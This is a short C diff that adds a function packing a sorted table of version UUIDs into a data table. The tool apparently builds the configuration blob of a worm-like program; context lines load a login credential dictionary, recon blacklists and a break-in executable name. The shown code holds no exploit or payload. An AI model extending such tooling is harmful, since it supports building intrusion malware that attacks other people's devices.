@@ -142,6 +142,19 @@ static void gen_mask (uint8_t *out) {
 	prne_free_imap(&q);
 }
 
+static void add_ver_mat () {
+	static uint8_t VER_MAT[] = PRNE_VER_MAT;
+	static const size_t nb_e = sizeof(VER_MAT) / 16;
+
+	prne_assert(sizeof(VER_MAT) % 16 == 0);
+	qsort(VER_MAT, nb_e, 16, prne_cmp_uuid_asc);
+
+	ENTRIES[PRNE_DATA_KEY_VER_MAT].data = VER_MAT;
+	ENTRIES[PRNE_DATA_KEY_VER_MAT].size = sizeof(VER_MAT);
+	ENTRIES[PRNE_DATA_KEY_VER_MAT].type = PRNE_DATA_TYPE_BIN;
+	ENTRIES[PRNE_DATA_KEY_VER_MAT].set = true;
+}
+
 int main (const int argc, const char **args) {
 	int callret;
 	uint8_t mask[256];
@@ -189,6 +202,7 @@ int main (const int argc, const char **args) {
 	add_bin(PRNE_DATA_KEY_RCN_BL_IPV6, PRNE_RCN_BL_IPV6);
 	add_file(PRNE_DATA_KEY_CRED_DICT, args[1]);
 	add_cstr(PRNE_DATA_KEY_EXEC_NAME, PRNE_BNE_EXEC_NAME);
+	add_ver_mat();
 
 	pos += NB_PRNE_DATA_KEY * sizeof(uint16_t);
 
